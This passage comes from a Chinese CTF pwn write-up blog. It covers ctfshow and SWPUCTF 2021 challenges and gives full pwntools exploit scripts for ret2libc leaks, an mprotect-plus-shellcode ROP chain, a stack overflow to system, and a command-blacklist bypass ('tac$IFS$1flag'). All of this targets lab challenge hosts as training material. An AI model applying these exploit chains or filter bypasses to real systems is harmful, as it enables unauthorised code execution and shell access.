<li>lib32目录：这是存放32位架构的共享库的目录，但它主要用于64位系统的多架构支持。例如，64位的Linux系统可能需要兼容32位应用程序，这时候就会使用lib32目录来存放这些32位的共享库。通常位于<code>/usr/lib32</code>或者<code>/lib32</code>目录下。</li>
<li>lib64目录：这是存放64位架构的共享库的目录。在64位系统中，这是主要的共享库目录，用于存放64位的共享库文件。通常位于<code>/usr/lib64</code>或者<code>/lib64</code>目录下。</li>
<li>libx32目录：这是特定于x32 ABI（Application Binary Interface）的共享库目录。x32 ABI是一种特殊的ABI，它允许在64位系统上运行32位应用程序，但是使用更大的寄存器集，从而提高性能。libx32目录用于存放这种特定格式的共享库。通常位于<code>/usr/libx32</code>或者<code>/libx32</code>目录下。</li>
</ol>
<p>总结一下，这四个目录是为了在不同的架构和ABI条件下存放共享库文件，确保系统能够正确加载和运行应用程序。通常情况下，64位系统会使用lib64目录作为主要的共享库目录，同时lib32和libx32目录用于兼容32位和特定x32 ABI的应用程序。不过，请注意这些目录的具体位置可能会因Linux发行版和系统配置而有所不同。</p>
</blockquote>
<p><strong>注意点</strong>：这里的libc用网站查阅脚本本地可以打通，远程不行，于是用了libcSeacher</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28187</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p,s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line">puts   = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span> + <span class="number">4</span>) + p32(puts) + p32(main) + p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span> + <span class="number">4</span>) + p32(system) + p32(main) + p32(binsh)</span><br><span class="line">dbg()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：对于这个脚本，一般用LibcSeacher的时候可能会返回多个Libc版本，为了保证代码的健壮性，可以用<code>ldd --version</code>在本地调试的时候直接查看本地的libc版本这样的话，本地调试回快很多。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] There are multiple libc that meet current constraints :</span><br><span class="line">0 - libc6-i386_2.27-3ubuntu1_amd64</span><br><span class="line">1 - libc6_2.11.1-0ubuntu7.14_i386</span><br><span class="line">2 - libc6_2.11.1-0ubuntu7.15_i386</span><br><span class="line">3 - libc6_2.31-2_i386</span><br><span class="line">[+] Choose one : 2</span><br></pre></td></tr></table></figure>

<h2 id="pwn49-静态编译：修改内存权限mprotect"><a href="#pwn49-静态编译：修改内存权限mprotect" class="headerlink" title="pwn49(静态编译：修改内存权限mprotect)"></a>pwn49(静态编译：修改内存权限mprotect)</h2><p>对于静态编译的程序，可以用file或者ldd命令查看。</p>
<p><strong>静态编译特征</strong>：所有程序依赖的库函数和代码都被编译成最终的可执行文件。这意味着可执行文件包含了所有需要的代码，不需要依赖外部的动态链接库。所以文件可能会比较大，用IDA查看的话反编译的函数也很多，但是运行效率肯定会很高。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd ./pwn</span><br><span class="line">$ <span class="keyword">not</span> a dynamic executable</span><br><span class="line">$ file pwn</span><br><span class="line">$ ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>用vmmap查看内存布局的时候，可以看到stack是不可执行状态，所以我们要使用mprotect函数修改可执行权限</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x8048000  <span class="number">0</span>x80d7000  r-xp    <span class="number">8</span>f000      <span class="number">0</span> /mnt/d/Yixin/Download/pwn</span><br><span class="line"><span class="number">0</span>x80d8000  <span class="number">0</span>x80dc000  rw-p     <span class="number">4000</span>  <span class="number">8</span>f000 /mnt/d/Yixin/Download/pwn</span><br><span class="line"><span class="number">0</span>x80dc000  <span class="number">0</span>x80ff000  rw-p    <span class="number">23000</span>      <span class="number">0</span> [heap]</span><br><span class="line"><span class="number">0</span>xf7ff8000 <span class="number">0</span>xf7ffc000 r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line"><span class="number">0</span>xf7ffc000 <span class="number">0</span>xf7ffe000 r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"><span class="number">0</span>xfffdd000 <span class="number">0</span>xffffe000 rw-p    <span class="number">21000</span>      <span class="number">0</span> [stack]</span><br></pre></td></tr></table></figure>

<h3 id="mprotect函数原型"><a href="#mprotect函数原型" class="headerlink" title="mprotect函数原型"></a>mprotect函数原型</h3><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230803175812533.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230803175812533.png"  class="" lazyload></a>

<p>这里的注意点就两个：</p>
<ol>
<li>开始碧血是内存的起始地址，长度是页大小的整数倍</li>
<li>没必要将整个栈空间执行权限都进行修改，随便选择一个空间地址进行修改权限</li>
</ol>
<p>这里可以选择的段很多，举个例子bss段和got.plt段</p>
<blockquote>
<p><strong>注意点</strong>：可以用Ctfl + S 调出IDA Pro  所有段的跳转概览图</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.got.plt	 080DA000	080DA044	R	W</span><br><span class="line">.bss	     080DB320	080DBFFC	R	W	</span><br></pre></td></tr></table></figure>

<p>这里我们选择.got.plt的地址0x80DA000，找可写的段</p>
<p><strong>原因</strong>：这里不选择bss段的开头0x80DB320，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。</p>
<h3 id="read函数原型"><a href="#read函数原型" class="headerlink" title="read函数原型"></a>read函数原型</h3><blockquote>
<p>ssize_t read(int fd, void * buf, size_t count)<br>函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">M_addr  = <span class="number">0x80DA000</span></span><br><span class="line">M_size  =  <span class="number">0x1000</span></span><br><span class="line">M_proc  = <span class="number">7</span></span><br><span class="line">pop_ebx_esi_edi = <span class="number">0x08049bd9</span> <span class="comment"># pop ebx ; pop esi ; pop edi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect return read</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span> + <span class="number">4</span>) + p32(mprotect) + p32(pop_ebx_esi_edi) + p32(M_addr) + p32(M_size) + p32(M_proc)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># read return shellcode</span></span><br><span class="line">payload += p32(read) +p32(pop_ebx_esi_edi) + p32(<span class="number">0</span>) + p32(M_addr) +p32(M_size) + p32(M_addr)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pop-edx"><a href="#pop-edx" class="headerlink" title="pop_edx"></a>pop_edx</h3><p>需要解释的点：</p>
<ul>
<li><p>为什么要用参数把pop给扔出去呢？<br>因为不扔出去的话，后面的函数无法执行，两种情况</p>
<ol>
<li><p>两个函数以上的构成的rop链，下一个函数的地址不能作为上一个函数返回地址</p>
</li>
<li><p>第一个函数参数大于等于二的情况下，第二个函数作为返回地址时参数会受到影响</p>
<p><strong>操作</strong>：<strong>需要通过将参数移动到寄存器从而执行下一个函数（保证ESP在上一个函数执行完之后可以指向下一个函数的开头）</strong></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 两个函数，下一个函数的地址可以作为上一个函数的返回地址</span></span><br><span class="line">p32(puts) + p32(system) + p32(puts_got) + p32(binsh)</span><br><span class="line"><span class="comment"># 两个函数，下一个函数的地址不能作为上一个函数的返回地址p</span></span><br><span class="line">p32(puts) + p32(pop_edx_ret) + p32(puts_got) + p32(system) + p32(system_ret) + p32(binsh)</span><br><span class="line"><span class="comment"># 第一个函数参数大于等于二的情况下，第二个函数作为返回地址时参数会受到影响</span></span><br><span class="line"><span class="comment"># 错误示范</span></span><br><span class="line">p32(read) + p32(system) + p32(arg1) + p32(arg2) + p32(arg3)</span><br><span class="line"><span class="comment"># 正确示范</span></span><br><span class="line">p32(read) + p32(pop_edx_ebp_edi) + p32(arg1) + p32(arg2) + p32(arg3) + p32(system) + p32(system_ret) + p32(binsh)</span><br><span class="line"><span class="comment"># 复杂情况</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span> + <span class="number">4</span>) + p32(mprotect) + p32(pop_ebx_esi_edi) + p32(M_addr) + p32(M_size) + p32(M_proc)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># read return shellcode</span></span><br><span class="line">payload += p32(read) +p32(pop_ebx_esi_edi) + p32(<span class="number">0</span>) + p32(M_addr) +p32(M_size) + p32(M_addr)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="pwn50-mprotect-ret2libc"><a href="#pwn50-mprotect-ret2libc" class="headerlink" title="pwn50(mprotect ret2libc )"></a>pwn50(mprotect ret2libc )</h2><h3 id="彩蛋：解决中文输入法问题"><a href="#彩蛋：解决中文输入法问题" class="headerlink" title="彩蛋：解决中文输入法问题"></a>彩蛋：解决中文输入法问题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考链接：https://zhuanlan.zhihu.com/p/508797663</span></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">~/.pam_environment</span><br><span class="line"><span class="comment"># 加入以下几行：</span></span><br><span class="line">GTK_IM_MODULE DEFAULT=fcitx</span><br><span class="line">QT_IM_MODULE DEFAULT=fcitx</span><br><span class="line">XMODIFIERS DEFAULT=@im=fcitx</span><br><span class="line">SDL_IM_MODULE DEFAULT=fcitx</span><br><span class="line"><span class="comment"># 重启即可</span></span><br></pre></td></tr></table></figure>

<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">puts = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">ctfshow = elf.symbols[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span>     <span class="comment"># ret</span></span><br><span class="line">buf = <span class="number">0x602050</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(ctfshow)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello CTFshow&#x27;</span>,payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;puts addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment"># 用本地的libc不需要LibcSearcher</span></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">    lg(<span class="string">&#x27;system_addr&#x27;</span>,system) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+ p64(ret) + p64(pop_rdi) +p64(binsh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello CTFshow&#x27;</span>,payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<h3 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h3><blockquote>
<p>注意：对于陌生函数，用man命令可以查看函数原型</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h2 id="SWPUCTF-2021-新生赛-nc签到（字符串过滤）"><a href="#SWPUCTF-2021-新生赛-nc签到（字符串过滤）" class="headerlink" title="[SWPUCTF 2021 新生赛]nc签到（字符串过滤）"></a>[SWPUCTF 2021 新生赛]nc签到（字符串过滤）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这里的${IFS}加大括号的原因是这样的</p>
<blockquote>
<p>在Unix和Unix-like系统（包括Linux）的shell中，<code>$&#123;IFS&#125;</code>使用大括号的形式是为了明确地指定一个环境变量。大括号在这里的作用是告诉shell，<code>$&#123;IFS&#125;</code>是一个环境变量的名称，而不是一个常规的字符串。</p>
<p><code>$&#123;IFS&#125;</code>中的<code>IFS</code>是一个特殊的环境变量，表示”Internal Field Separator”（内部字段分隔符）。它用于定义用于分隔单词和字段的字符，默认情况下包含空格、制表符和换行符。</p>
<p>在大括号内使用<code>$&#123;IFS&#125;</code>是一种良好的编程实践，尤其是在以下情况下：</p>
<ol>
<li>当需要将环境变量放在复杂的表达式中，以确保shell正确识别变量的边界。</li>
<li>当环境变量名后面跟着其他字符时，用大括号来明确指定变量的范围。</li>
</ol>
<p>例如，<code>$&#123;IFS&#125;abc</code>将会将<code>IFS</code>与<code>abc</code>拼接在一起，以生成一个新的字符串，而不是将<code>IFS</code>视为一个完整的变量名。</p>
<p>总之，使用大括号<code>$&#123;&#125;</code>来引用环境变量是一种良好的编程习惯，可以避免因变量名与其他字符混淆而引发错误。但在<code>$&#123;IFS&#125;</code>这个特定的例子中，如果<code>IFS</code>后面没有紧跟其他字符，大括号并不是必需的。所以在<code>$&#123;IFS&#125;</code>和<code>$IFS</code>之间没有实际的差异。</p>
</blockquote>
<p>但是，这里的字符串过滤中过滤掉了{IFS}，所以我们只能用空字符将其和后面的字符进行截断，这里使用的是$1,<code>$1</code>表示脚本或函数的第一个位置参数，为什么用这个呢？请看：</p>
<blockquote>
<p>如果没有传递任何参数给脚本，那么<code>$1</code>将为空。在这种情况下，<code>echo $1</code>将只打印出一个空行</p>
</blockquote>
<p>所以可以准确得出这里的$1可以将字符串进行截断，然后使用$IFS告诉终端这是一个环境变量代表的是空格，从而进行输出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">art = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   ((  &quot;####@@!!$$    ))</span></span><br><span class="line"><span class="string">       `#####@@!$$`  ))</span></span><br><span class="line"><span class="string">    ((  &#x27;####@!!$:</span></span><br><span class="line"><span class="string">   ((  ,####@!!$:   ))</span></span><br><span class="line"><span class="string">       .###@!!$:</span></span><br><span class="line"><span class="string">       `##@@!$:</span></span><br><span class="line"><span class="string">        `#@!!$</span></span><br><span class="line"><span class="string">  !@#    `#@!$:       @#$</span></span><br><span class="line"><span class="string">   #$     `#@!$:       !@!</span></span><br><span class="line"><span class="string">            &#x27;@!$:</span></span><br><span class="line"><span class="string">        &#x27;`\   &quot;!$: /`&#x27;</span></span><br><span class="line"><span class="string">           &#x27;\  &#x27;!: /&#x27;</span></span><br><span class="line"><span class="string">             &quot;\ : /&quot;</span></span><br><span class="line"><span class="string">  -.&quot;-/\\\-.&quot;//.-&quot;/:`\.&quot;-.JrS&quot;.&quot;-=_\\</span></span><br><span class="line"><span class="string">&quot; -.&quot;-.\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\-.&quot;.-\&quot;.-//&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(art)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My_shell_ProVersion&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            <span class="built_in">print</span>(command)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br><span class="line">    </span><br><span class="line">===================================================================================================================</span><br><span class="line">slove.py</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28994</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;tac$IFS$1flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）"><a href="#SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）"></a>[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）</h2><ol>
<li>直接用ida查看0x10 + 8</li>
</ol>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725121502497.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725121502497.png"  class="" lazyload></a>

<ol start="2">
<li><p>gdb覆盖查看，从rsp到rbp</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725121544874.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725121544874.png"  class="" lazyload></a>
</li>
<li><p>cyclic 偏移查看： 一般cyclic -l 错误的偏移地址</p>
<p>这道题根据偏移直接送结果就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./attach&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28217</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line">system = <span class="number">0x400480</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(system)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="gdb查看内存命令"><a href="#gdb查看内存命令" class="headerlink" title="gdb查看内存命令"></a>gdb查看内存命令</h3><blockquote>
<p>&#x2F;s                 查看相应地址的字符串<br>x&#x2F;i 		       查看汇编指令<br>x&#x2F;gx			 查看相应地址的二进制信息<br>x&#x2F;wx			按照字节形式显示二进制信息</p>
</blockquote>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-1676879380338.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-1676879380338.png"  class="" lazyload></a>








